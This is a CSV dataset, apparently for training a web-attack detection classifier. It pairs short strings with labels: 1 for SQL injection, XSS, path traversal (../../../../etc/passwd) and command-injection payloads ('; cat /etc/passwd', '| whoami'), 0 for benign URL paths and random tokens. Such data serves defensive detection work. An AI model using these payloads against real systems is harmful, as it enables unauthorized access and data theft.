payload,label
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=6 --,1
/search?id=7108,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
settings,0
contact,0
onerror=alert(1),1
/home?id=1561,0
pZVEfOsC,0
<script>var a=663;alert(a)</script>,1
user,0
javascript:alert(1),1
No030UXL1T7bM0O,0
/checkout?session=14208,0
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
blog,0
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=308,0
<script>var a=352;alert(a)</script>,1
/dashboard?id=2821,0
/blog?id=9535,0
checkout,0
1' o r '1'='1,1
javascript:alert(1),1
/index?id=9740,0
search,0
<script>var a=150;alert(a)</script>,1
/register?session=93106,0
<script>var a=414;alert(a)</script>,1
' OR 2=8 --,1
FXi2Q89YY0S,0
search,0
user,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
checkout,0
<script>var a=113;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/blog?id=8768,0
hbpqVW7HyFGjlI,0
<script>var a=282;alert(a)</script>,1
' OR 6=7 --,1
/contact?session=60283,0
gG4516F95KNohaK,0
/settings?session=22794,0
/profile?session=58598,0
1' o r '1'='1,1
<script>var a=851;alert(a)</script>,1
<script>var a=85;alert(a)</script>,1
<script>var a=760;alert(a)</script>,1
' OR 1=1 --,1
' OR 5=2 --,1
<script>var a=4;alert(a)</script>,1
search,0
<script>var a=260;alert(a)</script>,1
' OR 4=9 --,1
home,0
/settings?session=13208,0
' OR 3=5 --,1
blog,0
| whoami,1
/contact?id=6197,0
javascript:alert(1),1
/index?session=80227,0
; cat /etc/passwd,1
/checkout?id=5639,0
register,0
BuZwgyePIHZOaD9,0
<script>var a=889;alert(a)</script>,1
javascript:alert(1),1
<script>var a=502;alert(a)</script>,1
RTTFA1NFsIQ8yU,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
profile,0
/dashboard?session=53359,0
/about?id=6954,0
1' o r '1'='1,1
/search?session=74734,0
<script>alert(document.cookie)</script>,1
admin' --,1
' OR 1=4 --,1
../../../../etc/passwd,1
<script>var a=259;alert(a)</script>,1
/user?session=34731,0
/search?id=3843,0
/blog?session=53498,0
checkout,0
' OR 1=1 --,1
admin' --,1
' OR '1'='1,1
ygpIY3kl,0
IZ4Y4uB8AE3sizp,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?id=3337,0
rcyLrtUCEPivlw,0
' OR 4=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?session=59521,0
/index?id=5475,0
bRBk2lx9kJgc,0
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
login,0
/about?session=61964,0
/register?session=75317,0
' OR 5=1 --,1
user,0
profile,0
../../../../etc/passwd,1
GMEWJXg5,0
yCBXRDrKril,0
admin'/* bypass */OR 1=1,1
' OR 9=2 --,1
<script>var a=887;alert(a)</script>,1
/profile?session=24991,0
/blog?session=46562,0
search,0
' OR '1'='1,1
' OR 9=7 --,1
dYWvletw76,0
/index?session=66304,0
settings,0
../../../windows/win.ini,1
XBgWwNlqFv9id,0
1' o r '1'='1,1
/cart?session=47879,0
' OR 8=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
cart,0
' OR 5=9 --,1
<script>var a=572;alert(a)</script>,1
' OR 4=1 --,1
' OR 8=8 --,1
uhBiJbg202,0
/search?id=8849,0
admin'/* bypass */OR 1=1,1
/search?session=86947,0
<script>var a=530;alert(a)</script>,1
' OR 4=3 --,1
PgcDYOBdr7HSr,0
' OR 4=6 --,1
; cat /etc/passwd,1
../../../windows/win.ini,1
/cart?session=23868,0
cart,0
IrMkAKvZqCfQ0,0
/home?session=55671,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
Y5pF64GR5d,0
/blog?session=12735,0
/checkout?session=25956,0
VX4NijNRc,0
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
p96WwiFe,0
/home?session=80985,0
../../../../etc/passwd,1
QZKCI8LxM0Ojo,0
contact,0
IDggP9YK3I0q6J,0
<script>var a=924;alert(a)</script>,1
/login?session=94646,0
ahmVsX9Rd,0
settings,0
/settings?session=73012,0
lX6gO2IMDkOhE,0
' OR 9=6 --,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=978;alert(a)</script>,1
vbNrKEml2YSRU,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 2=6 --,1
blog,0
profile,0
/user?id=1545,0
/user?id=7825,0
' OR 7=4 --,1
admin' --,1
<script>var a=455;alert(a)</script>,1
' OR 5=1 --,1
' OR 8=1 --,1
<script>alert(document.cookie)</script>,1
/dashboard?id=8456,0
/contact?session=13472,0
' OR 4=9 --,1
javascript:alert(1),1
admin%00' OR 1=1,1
/home?id=8004,0
gP6WJiIlWo2gfk,0
' OR 3=7 --,1
/search?id=2492,0
| whoami,1
' OR '1'='1,1
' OR '1'='1,1
blog,0
settings,0
' OR 4=2 --,1
1EZZfY00qw,0
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=8 --,1
/checkout?id=1462,0
/user?id=2635,0
/profile?session=84419,0
MGDcmaYnPFs6B,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
/login?session=65419,0
1' o r '1'='1,1
BBMzWUvuX3gK,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=78;alert(a)</script>,1
/login?id=3879,0
checkout,0
1' o r '1'='1,1
' OR 1=1 --,1
/user?session=87873,0
' OR 3=4 --,1
onerror=alert(1),1
2EaSHdBILx,0
1' o r '1'='1,1
/about?id=3722,0
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=9849,0
javascript:alert(1),1
/user?id=9759,0
checkout,0
7B0APQxUC4a6Z,0
<script>var a=465;alert(a)</script>,1
Ky8V7UrTfuSOf0,0
javascript:alert(1),1
/home?id=1999,0
' OR 1=1 --,1
../../../../etc/passwd,1
/user?id=8950,0
blog,0
/register?session=13176,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
/cart?session=32110,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?id=8288,0
; cat /etc/passwd,1
/contact?id=750,0
/profile?session=51358,0
| whoami,1
index,0
uMYcCvrgZtexCbU,0
/blog?id=6972,0
cart,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
checkout,0
checkout,0
' OR 2=3 --,1
admin'/* bypass */OR 1=1,1
/contact?session=37548,0
' OR 5=1 --,1
/settings?session=31837,0
xftAdLp6jea5,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=3 --,1
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
<script>var a=957;alert(a)</script>,1
<script>var a=852;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=5 --,1
home,0
settings,0
T24M5Tdo0,0
' OR 1=4 --,1
' OR 6=9 --,1
' OR 8=9 --,1
/dashboard?id=6279,0
/login?id=4681,0
login,0
admin'/* bypass */OR 1=1,1
/index?id=2227,0
<script>alert(document.cookie)</script>,1
bfY3A9Ah,0
/index?session=68706,0
/cart?session=27562,0
index,0
/register?id=734,0
CkDTXMd2,0
<script>var a=170;alert(a)</script>,1
/dashboard?session=26226,0
register,0
/register?session=78599,0
/home?session=23165,0
HQscLStgcu4wAfH,0
../../../windows/win.ini,1
admin' --,1
checkout,0
blog,0
<script>var a=594;alert(a)</script>,1
1' o r '1'='1,1
wykxhpZrDNM,0
s E l E c T * f R o M a d m i n,1
checkout,0
yHXsn6oFw8dVoCI,0
<script>var a=113;alert(a)</script>,1
onerror=alert(1),1
uSdJSNaqgWW,0
' OR 1=1 --,1
settings,0
' OR 1=9 --,1
7LizSph6X0g,0
/login?id=960,0
../../../windows/win.ini,1
javascript:alert(1),1
settings,0
' OR 4=1 --,1
/dashboard?session=15258,0
/register?session=78046,0
/register?session=27534,0
cvUprU9hI,0
' OR 9=6 --,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
ZiyqFxvV2y8Z,0
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
<script>var a=95;alert(a)</script>,1
' OR 1=1 --,1
index,0
/login?id=7927,0
register,0
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
Yan8fy5krvr7S,0
/checkout?session=27060,0
' OR 1=1 --,1
../../../windows/win.ini,1
/home?id=446,0
/about?session=41138,0
/blog?id=164,0
admin%00' OR 1=1,1
register,0
javascript:alert(1),1
| whoami,1
/login?session=70958,0
c5j1lOtCDqx8b,0
<script>var a=964;alert(a)</script>,1
/contact?session=53482,0
<script>var a=654;alert(a)</script>,1
search,0
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
<script>var a=499;alert(a)</script>,1
/cart?session=36659,0
prPELhLUQnyauGf,0
<script>var a=127;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
| whoami,1
' OR 1=1 --,1
search,0
' OR 6=7 --,1
/settings?id=807,0
<script>var a=888;alert(a)</script>,1
' OR 6=2 --,1
/about?id=5071,0
5PGBDQZ1yN,0
' OR '1'='1,1
/dashboard?session=46160,0
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
/cart?id=9186,0
/contact?session=76559,0
/contact?session=80100,0
' OR 7=9 --,1
/register?id=1711,0
/blog?session=39741,0
/login?session=86581,0
onerror=alert(1),1
XymoocPeaKI,0
/contact?session=41401,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
' OR 2=8 --,1
settings,0
' OR 1=1 --,1
BilfhjG8GdIy6Ur,0
/contact?id=9865,0
<script>var a=270;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
admin' --,1
<script>var a=405;alert(a)</script>,1
profile,0
/checkout?session=89801,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=7 --,1
' OR 8=1 --,1
/settings?id=563,0
<script>var a=146;alert(a)</script>,1
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=55095,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
javascript:alert(1),1
; cat /etc/passwd,1
/search?id=4114,0
index,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
5nA5awnb7V,0
' OR 6=4 --,1
/user?session=34490,0
dashboard,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=3 --,1
/blog?session=86354,0
../../../windows/win.ini,1
/contact?session=68039,0
../../../windows/win.ini,1
neN9g4HzRzV,0
GuwCoNzk,0
/checkout?id=3403,0
/dashboard?session=19936,0
' OR '1'='1,1
profile,0
onerror=alert(1),1
/cart?id=9266,0
/register?session=68100,0
/profile?session=45630,0
/profile?id=7727,0
; cat /etc/passwd,1
home,0
register,0
blog,0
user,0
| whoami,1
1' o r '1'='1,1
contact,0
admin'/* bypass */OR 1=1,1
/login?id=5720,0
' OR 9=8 --,1
s E l E c T * f R o M a d m i n,1
<script>var a=714;alert(a)</script>,1
<script>var a=252;alert(a)</script>,1
' OR '1'='1,1
1ck2wLh3qWe,0
/home?id=4618,0
index,0
<script>var a=830;alert(a)</script>,1
oT7ZaprCvQO,0
/checkout?session=17287,0
wZx7nDFAUh5r7B,0
dqEkyjs0eIEia,0
ox2zjtbKpC5H,0
/index?id=1628,0
/profile?session=74892,0
onerror=alert(1),1
| whoami,1
admin'/* bypass */OR 1=1,1
profile,0
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
admin' --,1
JRYX1OklFGLh,0
/cart?id=4067,0
/profile?id=1795,0
; cat /etc/passwd,1
/home?id=7049,0
<script>var a=905;alert(a)</script>,1
/cart?id=2696,0
../../../../etc/passwd,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
' OR '1'='1,1
search,0
eJIanz0Noa1z28,0
9JfmLWqA,0
/checkout?id=7209,0
' OR 5=5 --,1
dashboard,0
/contact?session=18861,0
/dashboard?id=6874,0
1' o r '1'='1,1
3zrjVExG,0
<script>var a=476;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
admin' --,1
AQLEqI1zfnc,0
; cat /etc/passwd,1
/settings?session=57375,0
/dashboard?id=9594,0
cart,0
/index?id=7403,0
admin'/* bypass */OR 1=1,1
user,0
' OR 9=9 --,1
onerror=alert(1),1
P1VWjnGJyAM,0
/profile?id=3021,0
<script>var a=530;alert(a)</script>,1
6xuxfeEd,0
' OR 1=7 --,1
/cart?session=72491,0
PjET9Dj5naa,0
/profile?id=5187,0
settings,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=803;alert(a)</script>,1
' OR 1=1 --,1
6XoAtl9rKfY,0
/settings?id=724,0
user,0
/contact?id=2382,0
admin%00' OR 1=1,1
<script>var a=338;alert(a)</script>,1
' OR 3=5 --,1
javascript:alert(1),1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
' OR 7=1 --,1
' OR 8=9 --,1
search,0
' OR 3=1 --,1
/cart?id=7671,0
/checkout?id=8959,0
/index?id=3116,0
' OR 8=6 --,1
' OR '1'='1,1
njIIY1ET41s,0
4b9W1pICnfaV,0
' OR 1=1 --,1
/dashboard?session=49281,0
profile,0
<script>var a=359;alert(a)</script>,1
cugGbWzjf4S,0
/checkout?session=31509,0
; cat /etc/passwd,1
profile,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
../../../windows/win.ini,1
/contact?session=33006,0
/cart?id=3855,0
/settings?id=6166,0
profile,0
/register?session=44729,0
tl6k2VexYpSq8,0
/profile?session=80179,0
; cat /etc/passwd,1
/index?id=9516,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
CG519A5nJ,0
/search?session=99733,0
/search?id=7480,0
/dashboard?id=2874,0
<script>var a=914;alert(a)</script>,1
| whoami,1
/cart?id=7414,0
admin%00' OR 1=1,1
/register?session=52072,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=779;alert(a)</script>,1
/dashboard?id=6665,0
' OR 3=4 --,1
/about?session=72665,0
eQ4SLrmra4I9,0
<script>var a=755;alert(a)</script>,1
/cart?id=864,0
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
blog,0
settings,0
' OR 8=6 --,1
onerror=alert(1),1
' OR 5=8 --,1
' OR 6=2 --,1
/checkout?id=9330,0
contact,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
sILxYOoMifr,0
/about?id=5846,0
/checkout?session=20045,0
onerror=alert(1),1
/profile?session=87560,0
/profile?session=42491,0
/dashboard?id=3218,0
s E l E c T * f R o M a d m i n,1
admin' --,1
/about?id=7081,0
admin'/* bypass */OR 1=1,1
profile,0
/index?session=96885,0
profile,0
| whoami,1
/login?id=9141,0
/register?session=19396,0
<script>var a=268;alert(a)</script>,1
/index?id=4811,0
blog,0
admin%00' OR 1=1,1
/checkout?session=90576,0
/cart?session=34782,0
../../../windows/win.ini,1
; cat /etc/passwd,1
login,0
s E l E c T * f R o M a d m i n,1
' OR 3=9 --,1
onerror=alert(1),1
<script>var a=585;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
' OR 8=5 --,1
/register?session=72586,0
s E l E c T * f R o M a d m i n,1
settings,0
admin'/* bypass */OR 1=1,1
search,0
4ymFDT70jSvpUD,0
<script>var a=761;alert(a)</script>,1
1' o r '1'='1,1
/search?session=34385,0
9wwYtXdFV6,0
<script>var a=834;alert(a)</script>,1
' OR '1'='1,1
/login?id=624,0
/home?id=5955,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=52303,0
admin' --,1
tTW2ZxJA,0
<script>var a=179;alert(a)</script>,1
/about?session=81261,0
admin' --,1
admin%00' OR 1=1,1
../../../windows/win.ini,1
Fca2mKByr3g,0
contact,0
' OR 1=4 --,1
login,0
/checkout?id=4247,0
/index?id=1053,0
/home?session=72885,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
xcnMQPyi2,0
' OR 7=2 --,1
' OR 1=1 --,1
/about?session=77564,0
/checkout?session=97917,0
admin%00' OR 1=1,1
admin' --,1
/search?id=2753,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
onerror=alert(1),1
1' o r '1'='1,1
/index?id=1589,0
/dashboard?id=1709,0
1' o r '1'='1,1
<script>var a=32;alert(a)</script>,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=67276,0
/contact?session=57325,0
admin%00' OR 1=1,1
home,0
kwa1HgWu37FuKP,0
/home?id=7771,0
<script>var a=942;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
../../../windows/win.ini,1
blog,0
/contact?session=27073,0
blog,0
search,0
user,0
checkout,0
../../../../etc/passwd,1
' OR 1=7 --,1
' OR 7=4 --,1
RHRvtc6p,0
index,0
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=55924,0
| whoami,1
/cart?session=69748,0
<script>var a=925;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
settings,0
/index?session=79973,0
/contact?id=1581,0
../../../windows/win.ini,1
../../../windows/win.ini,1
home,0
' OR 3=3 --,1
/user?id=3736,0
' OR 9=8 --,1
ofkQqv2mIdE0UU,0
onerror=alert(1),1
PTe6biRkc,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
EoKGDG5Ke6OK,0
lADakzzRiS7YjO,0
ekMug2K1fb,0
login,0
SmTu2mBAGhgx,0
/user?session=34553,0
CqaIF19mktnfQ,0
1' o r '1'='1,1
' OR '1'='1,1
register,0
admin'/* bypass */OR 1=1,1
dashboard,0
/settings?session=35737,0
<script>var a=390;alert(a)</script>,1
about,0
javascript:alert(1),1
' OR 2=5 --,1
' OR 5=7 --,1
' OR 1=1 --,1
/contact?session=90605,0
HL3KmmfYMNR,0
/cart?session=69647,0
user,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
' OR 6=2 --,1
' OR 7=8 --,1
' OR 8=5 --,1
' OR 1=1 --,1
<script>var a=839;alert(a)</script>,1
dashboard,0
/user?id=5754,0
1' o r '1'='1,1
1' o r '1'='1,1
' OR 9=9 --,1
../../../windows/win.ini,1
/blog?session=20436,0
/settings?session=12423,0
2owZb5HeFpYt2,0
/dashboard?session=22498,0
user,0
../../../windows/win.ini,1
admin' --,1
/home?session=29911,0
' OR 1=1 --,1
blog,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
register,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
about,0
gpSaezCQGrl,0
; cat /etc/passwd,1
QzOTA50xH,0
/home?session=23741,0
' OR 8=3 --,1
/search?id=4636,0
/blog?id=8252,0
9qlxXqo17UoF,0
pENUEOqkrC,0
/contact?id=9021,0
' OR 7=5 --,1
<script>var a=985;alert(a)</script>,1
/blog?id=6526,0
/home?session=75058,0
/checkout?id=6655,0
' OR 2=2 --,1
../../../windows/win.ini,1
index,0
/dashboard?session=75004,0
' OR 6=6 --,1
' OR 1=1 --,1
BimabvPGTinw,0
/settings?session=62525,0
MW7jpe27E3tr,0
' OR 4=1 --,1
javascript:alert(1),1
| whoami,1
s E l E c T * f R o M a d m i n,1
/blog?session=82433,0
profile,0
/search?session=53295,0
' OR 5=9 --,1
/contact?session=57894,0
<script>var a=788;alert(a)</script>,1
' OR 1=7 --,1
RueI5MbWyG7fdVP,0
ozC7JfWMdD,0
HQv5AAogal,0
/settings?session=57838,0
' OR 9=2 --,1
/settings?session=31215,0
/contact?session=96999,0
pjJ9OvgQku7OG,0
<script>alert(document.cookie)</script>,1
' OR 1=3 --,1
<script>var a=613;alert(a)</script>,1
vBynf2QlEG,0
<script>var a=825;alert(a)</script>,1
; cat /etc/passwd,1
/settings?id=9552,0
/profile?id=2179,0
s E l E c T * f R o M a d m i n,1
' OR '1'='1,1
/search?session=36699,0
/settings?session=96992,0
<script>var a=327;alert(a)</script>,1
login,0
' OR 4=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=4 --,1
' OR 9=3 --,1
admin' --,1
' OR '1'='1,1
../../../../etc/passwd,1
/blog?session=10709,0
/index?id=257,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=3 --,1
' OR 5=7 --,1
dashboard,0
blog,0
admin'/* bypass */OR 1=1,1
/dashboard?id=3503,0
B8bwPt04hkeHkD,0
' OR 1=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=3756,0
/dashboard?id=1630,0
<script>var a=814;alert(a)</script>,1
' OR 6=7 --,1
/login?session=71665,0
/blog?id=768,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=4596,0
' OR 8=7 --,1
/profile?id=4399,0
' OR 7=3 --,1
<script>var a=210;alert(a)</script>,1
admin%00' OR 1=1,1
/dashboard?session=46375,0
home,0
<script>var a=436;alert(a)</script>,1
admin' --,1
settings,0
search,0
' OR 6=1 --,1
/about?id=4180,0
javascript:alert(1),1
index,0
search,0
pKKZ6NuDalOIle,0
<script>var a=95;alert(a)</script>,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=4 --,1
/dashboard?id=3567,0
NKoUH7cdp,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
<script>var a=910;alert(a)</script>,1
register,0
1HrlG8NTJM29Ii,0
onerror=alert(1),1
; cat /etc/passwd,1
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
../../../windows/win.ini,1
/search?session=62779,0
register,0
' OR 9=2 --,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/contact?id=991,0
s E l E c T * f R o M a d m i n,1
/about?session=21085,0
; cat /etc/passwd,1
/contact?id=7199,0
' OR 9=2 --,1
' OR 7=5 --,1
NqzeFWAeK,0
' OR 8=6 --,1
/user?session=26892,0
<script>var a=638;alert(a)</script>,1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 6=1 --,1
/user?session=37715,0
admin'/* bypass */OR 1=1,1
login,0
/settings?id=1365,0
cart,0
' OR 9=8 --,1
kSMu8gpsAVbxiHA,0
index,0
/user?session=54821,0
admin%00' OR 1=1,1
/search?session=75618,0
/profile?id=5577,0
user,0
<script>var a=273;alert(a)</script>,1
| whoami,1
XGxZwA7d,0
checkout,0
<script>var a=625;alert(a)</script>,1
checkout,0
/checkout?session=60766,0
E8sCyQ727GW,0
admin%00' OR 1=1,1
/dashboard?id=6895,0
<script>var a=254;alert(a)</script>,1
97u7Za7cz6w6,0
/login?session=93803,0
checkout,0
admin' --,1
/register?session=52287,0
<script>var a=202;alert(a)</script>,1
P2MSUKVZy,0
/checkout?session=99343,0
G5tlVSPv,0
' OR 8=6 --,1
' OR 1=1 --,1
dashboard,0
javascript:alert(1),1
dashboard,0
/blog?id=8189,0
/blog?session=72523,0
/search?id=282,0
<script>var a=356;alert(a)</script>,1
/contact?session=33227,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?id=2125,0
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
/about?id=5874,0
<script>var a=231;alert(a)</script>,1
../../../../etc/passwd,1
<script>var a=542;alert(a)</script>,1
' OR 3=3 --,1
/settings?session=76389,0
contact,0
; cat /etc/passwd,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
' OR 7=5 --,1
admin%00' OR 1=1,1
Ng7h0U6Jeo,0
/cart?session=11519,0
' OR 4=6 --,1
ZKWR3pv3SeO,0
/cart?id=3257,0
admin'/* bypass */OR 1=1,1
/checkout?id=991,0
| whoami,1
/settings?id=3104,0
/cart?id=5236,0
/contact?session=86813,0
/home?session=99054,0
s E l E c T * f R o M a d m i n,1
<script>var a=618;alert(a)</script>,1
/blog?session=85103,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
cart,0
/register?session=19340,0
0Z5iT2C3sVEk,0
login,0
gkSsC9FfMTWI,0
<script>var a=555;alert(a)</script>,1
' OR 5=2 --,1
admin%00' OR 1=1,1
GKN7k0BUUBwud5,0
onerror=alert(1),1
' OR 1=2 --,1
<script>var a=865;alert(a)</script>,1
' OR 5=1 --,1
s E l E c T * f R o M a d m i n,1
checkout,0
<script>var a=332;alert(a)</script>,1
<script>var a=536;alert(a)</script>,1
<script>var a=92;alert(a)</script>,1
| whoami,1
bbMgdeeUi1T9,0
contact,0
about,0
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
YT4LkIt4,0
' OR 2=8 --,1
../../../windows/win.ini,1
register,0
admin' --,1
o7Ga5eYT3,0
settings,0
login,0
' OR 1=1 --,1
<script>var a=75;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
cart,0
s E l E c T * f R o M a d m i n,1
' OR 1=4 --,1
L6YAu7flE4az1uu,0
settings,0
; cat /etc/passwd,1
' OR 2=6 --,1
/contact?id=6083,0
/index?session=24634,0
simdcXd9jLJf,0
' OR '1'='1,1
<script>var a=200;alert(a)</script>,1
/login?session=11370,0
/user?id=6806,0
' OR 2=3 --,1
/dashboard?session=70901,0
' OR 1=1 --,1
/register?session=15393,0
profile,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=85674,0
user,0
9CSXQ4RHnf6xg2,0
<script>var a=174;alert(a)</script>,1
contact,0
h7uE3g0bRauZMN5,0
<script>var a=538;alert(a)</script>,1
/login?session=35419,0
MyWiMOkj,0
q4d6pulFre1K4y,0
/checkout?id=3141,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
NlFegoKND7,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=9964,0
/cart?session=12135,0
<script>var a=894;alert(a)</script>,1
/search?id=8339,0
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
/user?session=90780,0
' OR '1'='1,1
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=23153,0
onerror=alert(1),1
onerror=alert(1),1
